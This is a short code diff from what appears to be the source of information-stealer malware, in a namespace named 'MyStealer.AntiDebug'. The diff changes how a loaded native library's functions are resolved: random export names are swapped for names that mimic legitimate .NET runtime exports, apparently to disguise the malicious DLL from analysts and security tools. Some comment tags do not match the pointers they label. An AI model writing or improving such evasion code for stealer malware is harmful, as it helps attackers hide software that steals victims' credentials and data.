@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Runtime.InteropServices;
 
 namespace MyStealer.AntiDebug
@@ -50,10 +50,10 @@ namespace MyStealer.AntiDebug
         internal static void Init(string libPath)
         {
             var dll = LoadLibrary(libPath);
-            pfnMyEntryPoint = Marshal.GetDelegateForFunctionPointer<DMyEntryPoint>(GetProcAddress(dll, /*<cs_entrypoint>*/"sGOzKMrPPZKiLrUeMmGGiynOqGxbpscw"/*</cs_entrypoint>*/));
-            pfnMyGetProcAddress = Marshal.GetDelegateForFunctionPointer<DMyGetProcAddress>(GetProcAddress(dll, /*<cs_getmodulehandle>*/"OPQUdjPzYafXWTbwTsRSnKDUfIsRccjX"/*</cs_getmodulehandle>*/));
-            pfnMyGetModuleHandle = Marshal.GetDelegateForFunctionPointer<DMyGetModuleHandle>(GetProcAddress(dll, /*<cs_getprocaddress>*/"JlpOIKnyFcppYkxkizCzhKXJZwGqJkTh"/*</cs_getprocaddress>*/));
-            pfnMyGetPeb = Marshal.GetDelegateForFunctionPointer<DMyGetPeb>(GetProcAddress(dll, /*<cs_getpeb>*/"JgXkfeMHMhdFbLUVMOKHRkyCGyKEeByb"/*</cs_getpeb>*/));
+            pfnMyEntryPoint = Marshal.GetDelegateForFunctionPointer<DMyEntryPoint>(GetProcAddress(dll, /*<cs_entrypoint>*/"AcmStartupObject"/*</cs_entrypoint>*/));
+            pfnMyGetProcAddress = Marshal.GetDelegateForFunctionPointer<DMyGetProcAddress>(GetProcAddress(dll, /*<cs_getmodulehandle>*/"EeGetComObject"/*</cs_getmodulehandle>*/));
+            pfnMyGetModuleHandle = Marshal.GetDelegateForFunctionPointer<DMyGetModuleHandle>(GetProcAddress(dll, /*<cs_getprocaddress>*/"EeInitializeCom"/*</cs_getprocaddress>*/));
+            pfnMyGetPeb = Marshal.GetDelegateForFunctionPointer<DMyGetPeb>(GetProcAddress(dll, /*<cs_getpeb>*/"EeGetVerifier"/*</cs_getpeb>*/));
 
             InitIndirectCalls();
         }
